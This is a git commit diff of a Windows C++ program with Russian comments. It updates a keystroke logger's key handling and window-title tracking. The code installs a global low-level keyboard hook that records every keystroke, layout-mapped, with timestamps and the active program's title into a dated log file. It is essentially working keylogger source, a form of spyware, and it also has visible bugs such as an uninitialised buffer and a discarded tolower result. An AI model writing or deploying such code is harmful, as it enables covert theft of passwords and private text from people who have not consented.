d5c3543d418ed4b0ae9bb8f0ecb7a1daf4b5ef2c
Alexashin <aleksashin.ar@gmail.com>
2023-12-17 21:33:42 +0300

    Update logging function to handle special keys and window title changes.

--- main.cpp
+++ main.cpp
@@ -2,7 +2,7 @@
 #include <time.h>
 #include <iostream>
 #include <fstream>
-
+#include <winuser.h>
 using namespace std;
 
 // Функция обратного вызова. Срабатывает при нажатии
@@ -33,14 +33,169 @@ char *GetLogFileName()
     char buf[64];
     strftime(buf, sizeof(buf), "%d.%m.%Y", localtime(&tm));
     static char logName[128];
-    strcpy(logName, "log");
+    strcpy(logName, "log_");
     strcat(logName, buf);
     strcat(logName, ".txt");
     return logName;
 }
 
-void WriteKey(int key)
+// другой вариант проверки
+
+// void SecWriteSimlpKey(int key)
+// {
+//     char crrKey;
+//     HKL kbLayout;
+//     bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+//     if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
+//         (GetKeyState(VK_RSHIFT) & 0x0001) != 0 ||
+//         (GetKeyState(VK_LSHIFT) & 0x0001) != 0)
+//         {
+//             crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, kbLayout)
+//         }
+// }
+
+// Проверка нажатия caps+shift, запись обычных клавиш
+// void WriteSimpl(int key)
+// {
+//     if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
+//     {
+//         char c = toupper((char)key);
+//         file << c << GetTime();
+//     }
+//     else
+//     {
+//         char c = tolower((char)key);
+//         file << c << GetTime();
+//     }
+// }
+
+// void WriteKey(int key, HWND hwnd)
+// {
+//     switch (key)
+//     {
+//     case VK_BACK:
+//         file << "[BACKSPACE]" << GetTime();
+//         break;
+//     case VK_RETURN:
+//         file << "[ENTER]" << GetTime();
+//         break;
+//     case VK_SPACE:
+//         file << "[SPACE]" << GetTime();
+//         break;
+//     case VK_TAB:
+//         file << "[TAB]" << GetTime();
+//         break;
+//     case VK_SHIFT:
+//     case VK_LSHIFT:
+//     case VK_RSHIFT:
+//         file << "[SHIFT]" << GetTime();
+//         break;
+//     case VK_CONTROL:
+//     case VK_LCONTROL:
+//     case VK_RCONTROL:
+//         file << "[CTRL]" << GetTime();
+//         break;
+//     case VK_ESCAPE:
+//         file << "[ESC]" << GetTime();
+//         break;
+//     case VK_END:
+//         file << "[END]" << GetTime();
+//         break;
+//     case VK_HOME:
+//         file << "[HOME]" << GetTime();
+//         break;
+//     case VK_UP:
+//         file << "[UP]" << GetTime();
+//         break;
+//     case VK_DOWN:
+//         file << "[DOWN]" << GetTime();
+//         break;
+//     case VK_LEFT:
+//         file << "[LEFT]" << GetTime();
+//         break;
+//     case VK_RIGHT:
+//         file << "[RIGHT]" << GetTime();
+//         break;
+//     case 190:
+//     case 110:
+//         file << "." << GetTime();
+//         break;
+//     case 189:
+//     case 109:
+//         file << "[RIGHT]" << GetTime();
+//         break;
+//     case 20:
+//         file << "[CAPS]" << GetTime();
+//         break;
+//     default: // TODO: сомнительное решение
+//         // if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
+//         // {
+//         //     char c = toupper((char)key);
+//         //     file << c << GetTime();
+//         //     break;
+//         // }
+//         // else
+//         // {
+//         //     // char c = tolower(key);
+//         //     file << key << GetTime();
+//         // }
+//         // // file << key << GetTime();
+//         // break;
+//         char crrKey;
+
+//         bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+//         if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
+//             (GetKeyState(VK_LSHIFT) & 0x0001) != 0 ||
+//             (GetKeyState(VK_RSHIFT) & 0x0001) != 0)
+//         {
+//             lower = !lower;
+//         }
+//         // id процесса
+//         DWORD pid;
+//         pid = GetWindowThreadProcessId(hwnd, NULL);
+//         HKL kbLayout;
+//         kbLayout = GetKeyboardLayout(pid);
+//         crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, kbLayout);
+//         if (!lower)
+//         {
+//             tolower(crrKey);
+//         }
+
+//         file << char(crrKey);
+//     }
+// }
+
+int Save(int key)
 {
+    if (key == 1 || key == 2)
+    {
+        return 0;
+    }
+
+    // Имя предыдущего окна
+    wchar_t prevProgName[256];
+    // Получение активного окна
+    HWND hwnd = GetForegroundWindow();
+
+    // Раскладка клавиатуры
+
+    // Если есть активное окно
+    if (hwnd)
+    {
+        // Заголовок окна
+        wchar_t currProgName[256];
+        GetWindowTextW(hwnd, currProgName, 256);
+
+        // Сравниваем заголовки программ
+        if (wcscmp(currProgName, prevProgName) != 0)
+        {
+            wcscpy(prevProgName, currProgName);
+            // file << "\n[" << GetTime() << "] [" << currProgName << "]\n";
+
+            file << "\n\n[Program: \"" << currProgName << "\" - " << GetTime() << "]\n";
+        }
+    }
     switch (key)
     {
     case VK_BACK:
@@ -55,10 +210,14 @@ void WriteKey(int key)
     case VK_TAB:
         file << "[TAB]" << GetTime();
         break;
-    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: 
+    case VK_SHIFT:
+    case VK_LSHIFT:
+    case VK_RSHIFT:
         file << "[SHIFT]" << GetTime();
         break;
-    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
+    case VK_CONTROL:
+    case VK_LCONTROL:
+    case VK_RCONTROL:
         file << "[CTRL]" << GetTime();
         break;
     case VK_ESCAPE:
@@ -82,56 +241,81 @@ void WriteKey(int key)
     case VK_RIGHT:
         file << "[RIGHT]" << GetTime();
         break;
-    case 190: case 110:
+    case 190:
+    case 110:
         file << "." << GetTime();
         break;
-    case 189: case 109:
+    case 189:
+    case 109:
         file << "[RIGHT]" << GetTime();
         break;
     case 20:
         file << "[CAPS]" << GetTime();
         break;
-    default: // TODO: проверка нажатия шифта с капсом
-        file << key << GetTime();
-        break;
+    default: // TODO: сомнительное решение
+        // if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
+        // {
+        //     char c = toupper((char)key);
+        //     file << c << GetTime();
+        //     break;
+        // }
+        // else
+        // {
+        //     // char c = tolower(key);
+        //     file << key << GetTime();
+        // }
+        // // file << key << GetTime();
+        // break;
+        char crrKey;
+
+        bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+        if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
+            (GetKeyState(VK_LSHIFT) & 0x0001) != 0 ||
+            (GetKeyState(VK_RSHIFT) & 0x0001) != 0)
+        {
+            lower = !lower;
+        }
+        // id процесса
+        DWORD pid;
+        pid = GetWindowThreadProcessId(hwnd, NULL);
+        HKL kbLayout;
+        kbLayout = GetKeyboardLayout(pid);
+        crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, kbLayout);
+        if (!lower)
+        {
+            tolower(crrKey);
+        }
+
+        file << char(crrKey);
     }
+    file.flush();
+
+    return 0;
 }
 
-int Save(int key)
+LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    if (key == 1 || key == 2)
+    if (nCode >= 0 && wParam == WM_KEYDOWN)
     {
-        return 0;
+        kbStruct = *((KBDLLHOOKSTRUCT *)lParam);
+        Save(kbStruct.vkCode);
     }
 
-    // Имя предыдущего окна
-    wchar_t prevProgName[256];
-    // Получение активного окна
-    HWND hwnd = GetForegroundWindow();
-    // id процесса
-    DWORD pid;
-    // Раскладка клавиатуры
-    HKL kbLayout;
+    return CallNextHookEx(hook, nCode, wParam, lParam);
+}
+
+int main()
+{
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
+
+    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
+    {
+        printf("Something go wrong!");
+    }
     // Открываем файл лога
     file.open(GetLogFileName(), ios::app | ios::out);
-    // Если есть активное окно
-    if (hwnd)
-    {
-        pid = GetWindowThreadProcessId(hwnd, NULL);
-        kbLayout = GetKeyboardLayout(pid);
-
-        // Заголовок окна
-        wchar_t currProgName[256];
-        GetWindowTextW(hwnd, currProgName, 256);
-
-        // Сравниваем заголовки программ
-        if (wcscmp(currProgName, prevProgName) != 0)
-        {
-            wcscpy(prevProgName, currProgName); // FIXME: возможно нужно поменять местами
-            // Запись в файл информации о времени и имени новой программы
-            file << "\n\n[Program: \"" << currProgName << "\" - " << GetTime() << "]\n";
-        }
-        // Запись клавиши при активном окне
-        WriteKey(key);
-    }
+    MSG message;
+    while (true)
+        GetMessage(&message, NULL, 0, 0);
 }
